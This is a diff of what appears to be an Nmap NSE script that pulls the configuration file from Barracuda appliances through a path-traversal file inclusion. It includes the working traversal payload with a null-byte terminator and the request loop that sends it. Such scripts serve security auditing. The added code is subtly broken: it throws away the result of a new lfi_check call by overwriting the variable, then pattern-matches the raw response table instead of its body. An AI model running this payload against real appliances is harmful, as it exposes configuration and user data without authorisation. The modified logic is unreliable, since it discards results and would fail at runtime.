@@ -3,6 +3,7 @@ local shortport = require "shortport"
 local stdnse = require "stdnse"
 local string = require "string"
 local table = require "table"
+local exploit = require "exploit"
 
 description = [[
 Attempts to retrieve the configuration settings from a Barracuda
@@ -88,11 +89,13 @@ action = function(host, port)
   local result = {}
   local paths = {"/cgi-bin/view_help.cgi", "/cgi-mod/view_help.cgi"}
   local payload = "?locale=/../../../../../../../mail/snapshot/config.snapshot%00"
+  local file = "/mail/snapshot/config.snapshot"
   local user_count = 0
   local config_file = ""
 
   -- Loop through vulnerable files
   stdnse.debug1("Connecting to %s:%s", host.targetname or host.ip, port.number)
+
   for _, path in ipairs(paths) do
 
     -- Retrieve file
@@ -105,21 +108,13 @@ action = function(host, port)
 
         -- Attempt config file retrieval with LFI exploit
         stdnse.debug1("Exploiting: %s", tostring(path .. payload))
+        local status, lfi_success, data = exploit.lfi_check(host, port, payload, file, nil, nil, '%00')
         data = http.get(host, port, tostring(path .. payload))
-        if data and data.status and tostring(data.status):match("200") and data.body and data.body ~= "" then
-
-          -- Check if the HTTP response contains a valid config file in MySQL database dump format
-          if string.match(data.body, "DROP TABLE IF EXISTS config;") and string.match(data.body, "barracuda%.css") then
-            config_file = data.body
-            break
-          end
-
-        else
-          stdnse.debug1("Failed to retrieve file: %s", tostring(path .. payload))
+        if data and string.match(data, "DROP TABLE IF EXISTS config;") and  string.match(data.body, "barracuda%.css") then
+          config_file = data.body
+          break
         end
-
       end
-
     else
       stdnse.debug1("Failed to retrieve file: %s", tostring(path))
     end
